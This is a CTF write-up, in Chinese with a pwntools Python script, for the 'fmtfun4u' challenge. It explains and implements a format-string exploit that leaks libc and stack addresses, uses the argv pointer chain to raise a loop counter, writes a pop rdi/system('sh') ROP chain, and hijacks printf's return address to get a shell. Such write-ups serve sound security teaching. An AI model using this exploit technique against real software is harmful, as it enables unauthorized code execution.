## fmtfun4u
### solution
本題有format string漏洞可以使用，由於buffer不在stack上，而因為題目設計導致main不會return，因此無法使用rbp chain，必須使用argv chain來exploit。

本題開啟了Full RELRO，因此無法改寫got，必須考慮return to libc等方式，首先透過leak stack上的`argv`和`__libc_start_main+240`我們可以輕鬆拿到stack和libc的位置，接著就是決定要改寫哪個return pointer，由於main不會return，基本上只能利用printf內的return，有在`.text`的`printf->main`、在libc的`vfprintf->printf`等等可以利用。

由於時間限制，在改寫printf內的return address時，基本上最多只能一次改寫到後兩個byte，因此只能跳到原address附近的目標，又因為libc在`printf`附近沒有什麼gadget可以使用，因此先不考慮。

在binary中，main下方的`__libc_csu_init`正好有`pop rdi; ret`的gadget可以作為`system`的參數，因此可以選擇此處，接下來的問題就是如何將ROP chain(`&"sh\x00"`, `system`)寫到stack上。

原本透過`argv`即可辦到任意寫，但是迴圈只會執行4次，不足以將ROP chain全部寫到stack上，不過恰好conuter `i`在`rbp-0x4`的位址，因此我們可以一開始就先把`i`寫為更大的值，如此就有足夠的次數來寫ROP chain，而`i`的位址剛好會和ROP chain中的`system`位址前16bytes有重疊，因此最後必須根據算出的`system`位址來決定i的值(因為是0x7fxx，次數一定夠寫)，才能成功跳到`system`。

當把ROP chain都寫到stack上後，改寫`printf->main`使其跳到`pop rdi; ret`即可。

步驟整理如下：
1. leak stack & libc
2. 計算需要的gadget及要改寫的變數位址(`system`, `&"sh\x00"`, `i`, `printf->main`, 寫入`rdi`的slot，寫入`system`的slot)
3. 透過`argv`將`i`改寫為`system >> 32`(前16bytes) + 後面總共input的次數
4. 透過`argv`將`&"sh\x00"`寫到stack(rdi slot)上
5. 透過`argv`將`system`(後32bytes)寫到stack上
6. 透過`argv`將`printf->main`改為`pop rdi; ret`

### script
```python
#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux')

#r = process("fmtfun4u")
r = remote('csie.ctf.tw', 10136)

binary = ELF('fmtfun4u')
rop = ROP(binary)
libc = ELF('libc.so.6')

def fmt(target, idx, size):
    if size == "hn":
        target &= 0xffff
    elif size == "hhn":
        target &= 0xff
    elif size == "n":
        target &= 0xffffffff
    return b"%%%dc%%%d$" % (target, idx) + size.encode()

def send(payload):
    r.recvuntil(":")
    r.sendline(payload)

# %9$p         | __libc_start_main+240, offset = 0x20830
# %11$p        | &argv
# %37$p        | argv = &argv - 0xd0
#--------------------stack-----------ROP-----
# argv - 0x100 | printf_return | pop rdi; ret
# argv - 0xf8  |               | &"sh\x00"
# argv - 0xf0  |               | system()

# leak libc & argv
send(b"%9$p %11$p")
r.recvuntil("0x")
libc_base = int(r.recv(12), 16) - 0x20830
r.recvuntil("0x")
argv = int(r.recv(12), 16)

# compute needed addresses
sh = libc_base + next(libc.search("sh\x00"))
system = libc_base + libc.symbols[b'system']

printf_return = argv - 0x100
rdi_slot = printf_return + 0x8
system_slot = printf_return + 0x10
i = argv - 0xec
pop_rdi = rop.rdi.address

# argv -> i = system[32..48] + 12
send(fmt(i, 11, "hn"))
send(fmt(((system >> 32) + 12), 37, "hn"))

# argv -> rdi_slot = sh[0..48]
for idx in range(3):
    send(fmt(rdi_slot + 0x2 * idx, 11, "hn"))
    send(fmt(sh >> 16 * idx, 37, "hn"))

# argv -> system_slot = system[0..32]
for idx in range(2):
    send(fmt(system_slot + 0x2 * idx, 11, "hn"))
    send(fmt(system >> 16 * idx, 37, "hn"))

# argv -> printf_return = pop_rdi
send(fmt(printf_return, 11, "hn"))
send(fmt(pop_rdi, 37, "hhn"))

r.interactive()
```
